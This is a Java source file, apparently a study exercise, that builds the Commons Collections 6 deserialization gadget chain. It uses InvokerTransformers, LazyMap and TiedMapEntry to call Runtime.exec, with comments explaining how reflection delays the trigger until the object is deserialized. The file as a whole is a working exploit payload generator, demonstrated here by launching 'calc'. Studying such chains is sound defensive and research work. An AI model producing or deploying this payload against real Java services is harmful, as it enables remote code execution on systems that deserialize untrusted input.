package gadget.cc;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import java.io.*;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.util.HashMap;
import java.util.Map;

public class CC6Test1 {
    public static void main(String[] args) throws IOException, ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException, NoSuchFieldException {

        Transformer[] transformers=new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod",new Class[] {String.class,Class[].class},new Object[] {"getRuntime",null}),
                new InvokerTransformer("invoke",new Class[] {Object.class,Object[].class},new Object[] {null,null}),
                new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc"}),
                new ConstantTransformer(1),
        };
        ChainedTransformer c=new ChainedTransformer(transformers);

        HashMap map=new HashMap();
        Map lazyMap= LazyMap.decorate(map,new ConstantTransformer(1));//先放进去一个触发不了的,避免序列化的时候触发

        TiedMapEntry tiedMapEntry=new TiedMapEntry(lazyMap,"Squirt1e");
        HashMap<Object,String> hashmap=new HashMap<Object,String>();
        hashmap.put(tiedMapEntry,"Squirt1e");
        map.remove("Squirt1e");

       // 将factory重新赋值为lazyMap从而触发factory.transform
        Class clazz=LazyMap.class;
        Field factory=clazz.getDeclaredField("factory");
        factory.setAccessible(true);
        factory.set(lazyMap,c);

        byte[] payload = serialize(hashmap);
        unserialize(payload);
//        unserialize();
    }

    public static byte[] serialize(Object obj) throws IOException {
        ByteArrayOutputStream aos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(aos);
        oos.writeObject(obj);
        oos.flush();
        oos.close();
        return aos.toByteArray();
    }

    public static void unserialize(byte[] bytes) throws IOException, ClassNotFoundException {
        try {
            ByteArrayInputStream ais = new ByteArrayInputStream(bytes);
            ObjectInputStream ois = new ObjectInputStream(ais);
            ois.readObject();
            ois.close();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}

